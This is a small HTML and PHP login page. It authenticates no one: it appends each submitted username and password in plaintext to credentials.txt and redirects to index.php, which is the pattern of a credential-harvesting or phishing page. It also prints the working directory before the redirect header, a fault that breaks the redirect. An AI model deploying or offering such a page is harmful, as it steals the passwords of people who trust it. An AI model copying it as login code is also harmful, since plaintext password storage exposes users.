<!DOCTYPE html>
<html>
<head>
	<title>Login Page</title>
</head>
<body>
	<h1>Login Page</h1>
	<form method="post" action="login.php">
		<label>Username:</label>
		<input type="text" name="username"><br><br>
		<label>Password:</label>
		<input type="password" name="password"><br><br>
		<input type="submit" name="submit" value="Login">
	</form>
</body>
</html>

<?php
// Check if form is submitted
if(isset($_POST['submit'])) {
	// Get form data
	$username = $_POST['username'];
	$password = $_POST['password'];

	// Open text file for writing
	$file = fopen('credentials.txt', 'a');

	// Write username and password to file
	fwrite($file, "Username: $username, Password: $password\n");
      echo getcwd();

	// Close the file
	fclose($file);

	// Redirect to homepage
	header('Location: index.php');
	exit();
}
?>